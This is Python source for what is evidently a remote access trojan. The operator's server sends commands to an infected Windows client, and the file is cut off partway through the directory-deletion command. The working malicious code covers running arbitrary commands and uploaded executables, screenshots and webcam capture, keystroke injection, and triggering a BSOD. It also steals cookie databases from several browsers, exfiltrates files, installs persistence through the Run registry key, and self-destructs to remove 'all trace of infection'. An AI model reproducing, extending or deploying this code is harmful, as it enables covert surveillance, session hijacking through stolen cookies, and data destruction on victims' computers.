from shared.extras.double_command import (
    DoubleCommandResult,
    add_double_command,
    CommandResult,
    DoubleCommand,
    ArgumentType,
    EmptyReturn,
)
import socket

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from server_extras.client import Client


@add_double_command(
    "kill_proc",
    "kill_proc [ pid ]",
    "Kills a process on the client",
    [ArgumentType.integer],
    EmptyReturn,
)
class KillProcess(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import signal
        import os

        try:
            pid = int.from_bytes(sock.recv(8))
        except OSError:
            return
        try:
            os.kill(pid, signal.SIGTERM)
            sock.sendall("Y".encode("ascii"))
        except PermissionError:
            try:
                sock.sendall("N".encode("ascii"))
            except OSError:
                return
        except OSError:
            try:
                sock.sendall("?".encode("ascii"))
            except OSError:
                return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            client.socket.sendall(params[0].to_bytes(8))
        except TimeoutError:
            return CommandResult(DoubleCommandResult.timeout)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode("ascii")
        except OSError:
            print(
                "Maybe killed process, client did not respond with a success indicator."
            )
            return CommandResult(DoubleCommandResult.semi_success)
        match success_indicator:
            case "N":
                print("Client could not kill process.")
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print(
                    "Client responded that the PID doesn't exist, or that it is invalid."
                )
                return CommandResult(DoubleCommandResult.failure)
            case "Y":
                print("Killed process.")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print("Client returned unknown response.")
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "launch_exe",
    "launch_exe [ local exe path ]",
    "Launches an executable file on the client",
    [ArgumentType.string],
    int,
)
class LaunchExecutableFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import random
        import os

        exe_contents = bytearray()
        tmp_tries = 0
        while tmp_tries < 3:
            try:
                tmp_bytes = sock.recv(1024)
            except TimeoutError:
                break
            exe_contents += tmp_bytes
        if exe_contents == "EXIT".encode("ascii"):
            return
        exe_path = f"{os.getenv('TEMP')}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=5))}.exe"
        try:
            with open(exe_path, "wb") as tmp_exe_fd:
                tmp_exe_fd.write(exe_contents)
            proc = subprocess.Popen(
                exe_path, creationflags=subprocess.CREATE_NEW_CONSOLE
            )
            sock.sendall(str(proc.pid).encode("ascii"))
        except TimeoutError:
            return
        except OSError:
            try:
                sock.sendall(str(-1).encode("ascii"))
            except OSError:
                return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            with open(params[0], "rb") as exe_fd:
                client.socket.sendall(exe_fd.read())
        except TimeoutError:
            print(f"Connection to client timeouted...")
            return CommandResult(DoubleCommandResult.timeout)
        except OSError:
            client.socket.send("EXIT".encode("ascii"))
            print(f"Error opening file '{params[0]}'.")
            return CommandResult(DoubleCommandResult.param_error)
        client.socket.settimeout(10)
        try:
            proc_pid = int(client.socket.recv(10).decode("ascii"))
        except (TypeError, ValueError, OSError):
            proc_pid = None

        if proc_pid == None:
            print("Maybe launched process, client did not respond with a PID.")
            return CommandResult(DoubleCommandResult.semi_success)
        elif proc_pid == -1:
            print("Could not start process.")
            return CommandResult(DoubleCommandResult.failure)

        print(f"Launched process with PID: {proc_pid}")
        return CommandResult(DoubleCommandResult.success, proc_pid)


@add_double_command(
    "invoke_bsod",
    "invoke_bsod",
    "Invokes a BSOD on the client",
    [],
    EmptyReturn,
)
class InvokeBSOD(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import shared.command_consts
        import subprocess

        fail = False
        try:
            subprocess.Popen(shared.command_consts.EXECUTE_B64_BSOD)
        except OSError:
            fail = True
        try:
            if fail:
                sock.sendall("n".encode("ascii"))
            else:
                sock.sendall("y".encode("ascii"))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            response = client.socket.recv(1).decode("ascii")
        except OSError:
            print(
                f"Possibly invoked BSOD, client did not respond with a success status."
            )
            return CommandResult(DoubleCommandResult.semi_success)
        match response:
            case "y":
                print(f"Invoked BSOD on client.")
                return CommandResult(DoubleCommandResult.success)
            case "n":
                print(f"Client could not execute script.")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(f"Invalid success status from client.")
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "show_image",
    "show_image [ local image path ]",
    "Displays an image on the clients screen",
    [ArgumentType.string],
    EmptyReturn,
    required_client_modules=["Pillow"],
)
class ShowImage(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import threading
        import PIL.Image
        import io

        try:
            tmp_buf = sock.recv(4096)
            img_contents = bytearray(tmp_buf)
        except OSError:
            return
        try:
            while len(tmp_buf) == 4096:
                tmp_buf = sock.recv(4096)
                img_contents += tmp_buf
        except OSError:
            pass

        try:
            if img_contents.decode("ascii") == "EXIT".encode("ascii"):
                return
        except UnicodeDecodeError:
            pass

        threading.Thread(
            target=lambda img_contents: PIL.Image.open(io.BytesIO(img_contents)).show(),
            name="show_img",
            args=(img_contents,),
        ).start()

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            with open(params[0], "rb") as img_file:
                img_contents = img_file.read()
        except OSError:
            print(f"Error reading file: '{params[0]}'")
            try:
                client.socket.sendall("EXIT".encode("ascii"))
            except OSError:
                pass
            return CommandResult(DoubleCommandResult.param_error)

        try:
            client.socket.sendall(img_contents)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        print("Showed image on client.")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "screenshot",
    "screenshot",
    "Captures a screenshot on client",
    [],
    tuple[str, bytes],
    required_client_modules=["Pillow"],
)
class TakeScreenshot(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import PIL.ImageGrab
        import io

        tmp_io = io.BytesIO()
        PIL.ImageGrab.grab().save(tmp_io, format="PNG")

        try:
            sock.sendall(tmp_io.getvalue())
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("screenshots")
        except FileExistsError:
            pass

        try:
            tmp_buf = client.socket.recv(4096)
            img_contents = bytearray(tmp_buf)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)
        try:
            while len(tmp_buf) == 4096:
                tmp_buf = client.socket.recv(4096)
                img_contents += tmp_buf
        except OSError:
            pass

        tmp_name = ""
        try:
            with open(f"screenshots/{client.name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)
        except OSError:
            tmp_name = "".join(
                random.choices(
                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
                    k=5,
                )
            )
            with open(f"screenshots/{tmp_name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)

        print(f"Captured screenshot: screenshots/{tmp_name or client.name}.png")
        return CommandResult(
            DoubleCommandResult.success,
            (f"screenshots/{tmp_name or client.name}.png", bytes(img_contents)),
        )


@add_double_command(
    "typewrite",
    "typewrite [ string to type ] { character delay }",
    "Types a string on the clients keyboard",
    [ArgumentType.string, ArgumentType.optional_float],
    EmptyReturn,
    required_client_modules=["pyautogui"],
)
class TypeWrite(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import pyautogui
        import threading
        import struct

        try:
            interval = struct.unpack("d", sock.recv(8))[0]
            tmp_buf = sock.recv(1024)
            typewrite_str = bytearray(tmp_buf)
        except OSError:
            return

        try:
            while len(tmp_buf) == 1024:
                tmp_buf = sock.recv(1024)
                typewrite_str += tmp_buf
        except OSError:
            pass

        threading.Thread(
            target=lambda: pyautogui.typewrite(
                typewrite_str.decode("ascii", "ignore"), interval
            ),
            name="TypeWrite",
        ).start()

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import struct

        corrected_params = params
        if len(params) == 1:
            corrected_params = (params[0], 0)

        try:
            client.socket.sendall(struct.pack("d", corrected_params[1]))
            client.socket.sendall(corrected_params[0].encode("ascii"))
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        print(
            f"Asked client to type {len(params[0])} characters with an interval {params[1]} seconds between each letter"
        )
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "run_command",
    "run_command [ command ]",
    "Runs a command on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class RunCommand(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess

        try:
            tmp_buf = sock.recv(512)
            command = bytearray(tmp_buf)
        except OSError:
            return

        try:
            while len(tmp_buf) == 512:
                tmp_buf = sock.recv(512)
                command += tmp_buf
        except OSError:
            pass

        try:
            subprocess.Popen(command.decode("ascii"))
            sock.sendall("y".encode("ascii"))
        except OSError:
            try:
                sock.sendall("n".encode("ascii"))
            except OSError:
                pass
        except UnicodeDecodeError:
            try:
                sock.sendall("?".encode("ascii"))
            except OSError:
                pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            client.socket.sendall(params[0].encode("ascii"))
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode("ascii", "ignore")
        except (OSError, UnicodeDecodeError):
            print("Sent command, but client did not respond with a success status.")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                print("Executed command on client.")
                return CommandResult(DoubleCommandResult.success)
            case "n":
                print("Client could not execute command.")
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print("Client didn't understand command.")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent command, but client did not respond with a valid success status."
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "webcam_img",
    "webcam_img",
    "Captures an image from the clients webcam",
    [],
    tuple[str, bytes],
    required_client_modules=["opencv-python", "numpy"],
)
class CaptureWebcamImage(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import numpy
        import cv2

        capture = cv2.VideoCapture(0)

        if not capture.isOpened():
            try:
                sock.sendall("n".encode("ascii"))
            except OSError:
                pass
            return

        success, frame = capture.read()

        if not success:
            try:
                sock.sendall("f".encode("ascii"))
            except OSError:
                pass
            return

        capture.release()

        try:
            image_bytes = numpy.array(cv2.imencode(".png", frame)[1]).tobytes()
        except Exception:
            try:
                sock.sendall("?".encode("ascii"))
            except OSError:
                pass
            return

        try:
            sock.sendall("y".encode("ascii"))
        except OSError:
            pass

        try:
            sock.sendall(image_bytes)
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("webcam_images")
        except FileExistsError:
            pass

        try:
            success_indicator = client.socket.recv(1).decode("ascii", "ignore")
        except OSError:
            print("Client failed to respond with a success indicator.")
            return CommandResult(DoubleCommandResult.conn_error)

        match success_indicator:
            case "y":
                pass
            case "n":
                print("Client could not open webcam (they are probably missing one)")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("Client could not capture image (webcam error)")
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print("Client encountered an error while decoding the image")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print("Client failed to respond with a valid success indicator.")
                return CommandResult(DoubleCommandResult.failure)

        try:
            tmp_buf = client.socket.recv(4096)
            img_contents = bytearray(tmp_buf)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            while len(tmp_buf) == 4096:
                tmp_buf = client.socket.recv(4096)
                img_contents += tmp_buf
        except OSError:
            pass

        tmp_name = ""
        try:
            with open(f"webcam_images/{client.name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)
        except OSError:
            tmp_name = "".join(
                random.choices(
                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
                    k=5,
                )
            )
            with open(f"webcam_images/{tmp_name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)

        print(f"Captured screenshot: webcam_images/{tmp_name or client.name}.png")
        return CommandResult(
            DoubleCommandResult.success,
            (f"webcam_images/{tmp_name or client.name}.png", bytes(img_contents)),
        )


@add_double_command(
    "add_persistence",
    "add_persistence",
    "Adds the client infection to PC startup",
    [],
    str,
)
class AddPersistence(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import urllib.request
        import subprocess
        import zipfile
        import winreg
        import shutil
        import os

        def bail(msg: str) -> None:
            try:
                sock.sendall(msg.encode("ascii"))
            except OSError:
                pass
            shutil.rmtree(folder_path, ignore_errors=True)

        key_name = "C3Persistence"
        folder_name = key_name
        folder_path = f"{os.getenv('LOCALAPPDATA')}/{folder_name}"

        runtime_path = f"{folder_path}/runtime"
        runtime_zip_path = f"{runtime_path}/python-3.12.1-embed-amd64.zip"
        os.mkdir(folder_path)
        os.mkdir(runtime_path)

        try:
            urllib.request.urlretrieve(
                "https://www.python.org/ftp/python/3.12.1/python-3.12.1-embed-amd64.zip",
                runtime_zip_path,
            )
            with zipfile.ZipFile(runtime_zip_path, "r") as zip_file:
                zip_file.extractall(runtime_path)
            os.remove(runtime_zip_path)
        except Exception:
            bail("GETPY_ERR")
            return

        try:
            urllib.request.urlretrieve(
                "https://bootstrap.pypa.io/get-pip.py", f"{runtime_path}/get-pip.py"
            )
            get_pip_runner = subprocess.Popen(
                f"{runtime_path}/python.exe {runtime_path}/get-pip.py",
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            get_pip_runner.wait()
            os.remove(f"{runtime_path}/get-pip.py")
        except OSError:
            bail("GETPIP_ERR")
            return

        shutil.copytree("./client_extras", f"{folder_path}/client_extras")
        shutil.copytree("./server_extras", f"{folder_path}/server_extras")
        shutil.copytree("./shared", f"{folder_path}/shared")
        # .pyw files do not show a console window
        shutil.copy("./server.py", f"{folder_path}/server.pyw")
        shutil.copy("./client.py", f"{folder_path}/client.pyw")

        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_SET_VALUE,
            ) as startup_key:
                winreg.SetValueEx(
                    startup_key,
                    key_name,
                    0,
                    winreg.REG_SZ,
                    f"{runtime_path}/pythonw.exe {folder_path}/client.pyw",
                )
        except OSError:
            bail("REG_ERR")
            return
        try:
            sock.sendall(folder_path.encode("ascii"))
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            install_path = (
                client.socket.recv(128).decode("ascii", "ignore").replace("/", "\\")
            )
        except OSError:
            print("Client did not respond with a success indicator.")
            return CommandResult(DoubleCommandResult.conn_error)

        match install_path:
            case "REG_ERR":
                print("Client encountered registry error.")
                return CommandResult(DoubleCommandResult.failure)
            case "GETPY_ERR":
                print("Client failed to download the portable python environment.")
                return CommandResult(DoubleCommandResult.failure)
            case "GETPIP_ERR":
                print("Client failed to download pip (Pythons Intergalactic Penis).")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(f"Client installed persistence to '{install_path}'")
                return CommandResult(DoubleCommandResult.success, install_path)


@add_double_command(
    "reboot",
    "reboot { delay seconds }",
    "Reboots the client PC",
    [ArgumentType.optional_float],
    EmptyReturn,
)
class Reboot(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import threading
        import time

        def delayed_reboot(delay_in_ms: int) -> None:
            time.sleep(delay_in_ms / 1000)
            subprocess.Popen(["shutdown", "/f", "/r", "/t", "0"])

        try:
            threading.Thread(
                target=delayed_reboot,
                name="Delayed Reboot",
                args=[int.from_bytes(sock.recv(8))],
            ).start()
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        if len(params) == 0:
            params = (0,)

        try:
            client.socket.sendall(round(params[0] * 1000).to_bytes(8))
        except OSError:
            print(f"Failed to send delay time to client.")
            return CommandResult(DoubleCommandResult.conn_error)

        if params[0] == 0:
            print(f"Asked client to reboot immediately.")
        else:
            print(f"Asked client to reboot in {params[0]} seconds.")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "shutdown",
    "shutdown { delay seconds }",
    "Turns off the client PC",
    [ArgumentType.optional_float],
    EmptyReturn,
)
class Shutdown(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import threading
        import time

        def delayed_shutdown(delay_in_ms: int) -> None:
            time.sleep(delay_in_ms * 1000)
            subprocess.Popen(["shutdown", "/f", "/s", "/t", "0"])

        try:
            threading.Thread(
                target=delayed_shutdown,
                name="Delayed Shutdown",
                args=[int.from_bytes(sock.recv(8))],
            ).start()
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        if len(params) == 0:
            params = (0,)

        try:
            client.socket.sendall(round(params[0] * 1000).to_bytes(8))
        except OSError:
            print(f"Failed to send delay time to client.")
            return CommandResult(DoubleCommandResult.conn_error)

        if params[0] == 0:
            print(f"Asked client to shut down immediately.")
        else:
            print(f"Asked client to shut down in {params[0]} seconds.")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "self_destruct",
    "self_destruct",
    "Self destructs and removes all trace of infection on the client side",
    [],
    EmptyReturn,
)
class SelfDestruct(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        from shared.command_consts import SELF_DESTRUCT_TEMPLATE
        import subprocess
        import winreg
        import sys
        import os

        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                access=winreg.KEY_READ | winreg.KEY_WRITE,
            ) as startup_entries_key:
                num_entries = winreg.QueryInfoKey(startup_entries_key)[1]

                for entry_index in range(num_entries):
                    key_name, *_ = winreg.EnumValue(startup_entries_key, entry_index)
                    if key_name == "C3Persistence":
                        winreg.DeleteKey(
                            startup_entries_key,
                            key_name,
                        )
        except Exception:
            pass

        parent_dir = "/".join(os.path.split(__file__)[0].split("\\")[:-1])
        with open(f"{parent_dir}/self_destruct.bat", "w") as tmp_self_destruct_launcher:
            tmp_self_destruct_launcher.write(
                SELF_DESTRUCT_TEMPLATE.format(pdir=parent_dir)
            )
        subprocess.Popen(
            f"cmd /c {parent_dir}/self_destruct.bat && del /f {parent_dir}/self_destruct.bat && exit"
        )

        sys.exit()

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        print("Killed and asked client to self destruct.")
        client.kill()
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "steal_cookies",
    "steal_cookies",
    "Downloads cookies from the client",
    [],
    str,
)
class CookieStealer(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        LOCAL = os.getenv("LOCALAPPDATA")
        if LOCAL == None:
            return

        paths: dict[str, str] = {}
        if len(LOCAL) > 0:
            paths["chrome"] = f"{LOCAL}/Google/Chrome/User Data/Default/Network/Cookies"
            paths[
                "yandex"
            ] = f"{LOCAL}/Yandex/YandexBrowser/User Data/Network/Default/Cookies"
            paths[
                "brave"
            ] = f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies"
            paths["edge"] = f"{LOCAL}/Microsoft/Edge/User Data/Default/Network/Cookies"
            paths["vivaldi"] = f"{LOCAL}/Vivaldi/User Data/Default/Network/Cookies"
            paths["chromium"] = f"{LOCAL}/Chromium/User Data/Default/Network/Cookies"
            paths["torch"] = f"{LOCAL}/Torch/User Data/Default/Network/Cookies"

        for browser_name, path in paths.items():
            try:
                with open(path, "rb") as cookies_file:
                    cookies_sql = cookies_file.read()
                    sock.sendall(len(browser_name).to_bytes(8))
                    sock.sendall(len(cookies_sql).to_bytes(8))
                    sock.sendall(browser_name.encode("ascii"))
                    sock.sendall(cookies_sql)
            except OSError:
                continue

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("cookies")
        except FileExistsError:
            pass
        try:
            target_folder = f"cookies/{client.name}"
            os.mkdir(target_folder)
        except OSError:
            tmpname = "".join(
                random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=6)
            )
            target_folder = f"cookies/{tmpname}"
            os.mkdir(target_folder)

        is_first_run = True
        while True:
            try:
                lengths = client.socket.recv(16)
                name_length = int.from_bytes(lengths[:8])
                db_length = int.from_bytes(lengths[8:])
                filename = (
                    client.socket.recv(name_length)
                    .decode("ascii", "ignore")
                    .translate(str.maketrans({char: "" for char in '\\/*?<>:|"'}))
                )
                cookies_db = client.socket.recv(db_length)
                try:
                    with open(f"{target_folder}/{filename}.db", "wb") as cookies_db_fd:
                        cookies_db_fd.write(cookies_db)
                except OSError:
                    pass
                is_first_run = False
            except OSError:
                if is_first_run:
                    print("Client failed to send cookies.")
                    return CommandResult(DoubleCommandResult.conn_error)
                break

        print(
            f"Downloaded {len(os.listdir(target_folder))} cookie databases to {target_folder}"
        )
        return CommandResult(DoubleCommandResult.success, target_folder)


@add_double_command(
    "upload_file",
    "upload_file [ local path ] [ client side path ]",
    "Uploads a file to the client",
    [ArgumentType.string, ArgumentType.string],
    EmptyReturn,
)
class UploadFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        try:
            destination = sock.recv(int.from_bytes(sock.recv(8)))
            file_contents = sock.recv(int.from_bytes(sock.recv(8)))
        except OSError:
            return

        response = "y"
        try:
            with open(destination, "wb") as dest_file:
                dest_file.write(file_contents)
        except PermissionError:
            response = "p"
        except OSError:
            response = "?"

        try:
            sock.sendall(response.encode("ascii"))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import os

        if not os.path.isfile(params[0]):
            print(f"File '{params[0]} not found")
            return CommandResult(DoubleCommandResult.param_error)

        with open(params[0], "rb") as file_to_send:
            try:
                file_contents = file_to_send.read()
                client.socket.sendall(len(params[1]).to_bytes(8))
                client.socket.sendall(params[1].encode("ascii"))
                client.socket.sendall(len(file_contents).to_bytes(8))
                client.socket.sendall(file_contents)
            except OSError:
                print("Connection error whilst trying to send file")
                return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode("ascii")
        except OSError:
            print("Sent file but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                print("Sent file successfully")
                return CommandResult(DoubleCommandResult.success)
            case "p":
                print(
                    f"Client does not have permission to write the given file {params[1]}"
                )
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print(
                    f"Client says that the given destination file path ({params[1]}) is invalid"
                )
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent file but client did not respond with an invalid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "download_file",
    "download_file [ client side path ] [ local path ]",
    "Downloads a file from the client",
    [ArgumentType.string, ArgumentType.string],
    EmptyReturn,
    max_selected=1,
)
class DownloadFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        try:
            source = sock.recv(int.from_bytes(sock.recv(8)))
        except OSError:
            return

        response = "y"
        try:
            with open(source, "rb") as src_file:
                file_contents = src_file.read()
        except PermissionError:
            response = "p"
        except FileNotFoundError:
            response = "n"
        except OSError:
            response = "?"

        try:
            sock.sendall(response.encode("ascii"))
        except OSError:
            pass

        if response != "y":
            return
        try:
            sock.sendall(len(file_contents).to_bytes(8))  # type: ignore
            sock.sendall(file_contents)  # type: ignore
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            client.socket.sendall(len(params[0]).to_bytes(8))
            client.socket.sendall(params[0].encode("ascii"))
        except OSError:
            print("Connection error whilst trying to send source file path")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode("ascii")
        except OSError:
            print("Asked for file but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                try:
                    file_contents = client.socket.recv(
                        int.from_bytes(client.socket.recv(8))
                    )
                except OSError:
                    print("Connection error whilst trying to recieve file contents")
                    return CommandResult(DoubleCommandResult.conn_error)
                except MemoryError:
                    print("Client sent invalid information")
                    return CommandResult(DoubleCommandResult.failure)
                try:
                    with open(params[1], "wb") as dest_file:
                        dest_file.write(file_contents)
                except OSError:
                    print(f"Failure when writing to '{params[1]}")
                    return CommandResult(DoubleCommandResult.failure)
                print("Recieved and wrote file successfully")
                return CommandResult(DoubleCommandResult.success)
            case "p":
                print(
                    f"Client does not have permission to read the given file ('{params[0]}')"
                )
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print(
                    f"Client says that the given source file path ('{params[0]}') is invalid"
                )
                return CommandResult(DoubleCommandResult.failure)
            case "n":
                print(f"Client says that the given file ('{params[0]}') doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Recieved and wrote file but client did not respond with an invalid success indicator"
                )
                return CommandResult(DoubleCommandResult.failure)


@add_double_command(
    "open_url",
    "open_url [ url ]",
    "Opens a URL in a new webbrowser on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class OpenURL(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import webbrowser

        try:
            webbrowser.open(sock.recv(int.from_bytes(sock.recv(8))).decode("ascii"))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            client.socket.sendall(len(params[0]).to_bytes(8))
            client.socket.sendall(params[0].encode("ascii"))
        except OSError:
            print("Connection error whilst sending url to client")
            return CommandResult(DoubleCommandResult.failure)

        print("Opened url on client")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "ls",
    "ls [ directory ]",
    "Lists a directory on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class ListDirectory(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = sock.recv(int.from_bytes(sock.recv(8))).decode("utf-8", "ignore")
        except OSError:
            return

        items = []
        for item in os.listdir(path):
            abs_item = f"{path}/{item}"
            if os.path.isdir(abs_item):
                items.append(f"<DIR>  -> {item}")
            elif os.path.isfile(abs_item):
                items.append(f"<FILE> -> {item}")
        output = "\n".join(items).encode("utf-8")
        try:
            sock.sendall(len(output).to_bytes(8))
            sock.sendall(output)
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            path = params[0].encode("utf-8")
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            contents = client.socket.recv(int.from_bytes(client.socket.recv(8))).decode(
                "utf-8", "ignore"
            )
            print(contents)
        except (OSError, MemoryError):
            print(f"Error recieving items in {params[0]}")
            return CommandResult(DoubleCommandResult.failure)
        return CommandResult(DoubleCommandResult.success, contents)


@add_double_command(
    "mkdir",
    "mkdir [ directory path ]",
    "Creates a directory on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class MakeDirectory(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = sock.recv(int.from_bytes(sock.recv(8))).decode("utf-8", "ignore")
        except OSError:
            return

        try:
            os.mkdir(path)
        except PermissionError:
            status = "p"
        except FileExistsError:
            status = "f"
        except FileNotFoundError:
            status = "d"
        except OSError:
            status = "n"
        else:
            status = "y"

        try:
            sock.sendall(status.encode("utf-8"))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            path = params[0].encode("utf-8")
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            status = client.socket.recv(1).decode("utf-8", "ignore")
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match status:
            case "n":
                print("There was an error when creating the directory")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("Directory already exists")
                return CommandResult(DoubleCommandResult.failure)
            case "d":
                print("Parent directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case "p":
                print("The client does not have permission to create such directory")
                return CommandResult(DoubleCommandResult.failure)
            case "y":
                print("Successfully created directory")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "rmdir",
    "rmdir [ directory path ]",
    "Recursively deletes a directory on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class DeleteDirectory(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os.path
        import shutil

        try:
            path = sock.recv(int.from_bytes(sock.recv(8))).decode("utf-8", "ignore")
        except OSError:
            return

        try:
            shutil.rmtree(path)
        except PermissionError:
            status = "p"
        except FileNotFoundError:
            status = "d"
        except OSError:
            status = "n"
        else:
            status = "y"

        if os.path.isfile(path):
            status = "f"

        try:
            sock.sendall(status.encode("utf-8"))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            path = params[0].encode("utf-8")
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            status = client.socket.recv(1).decode("utf-8", "ignore")
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match status:
            case "n":
                print("There was an error when deleting the directory")
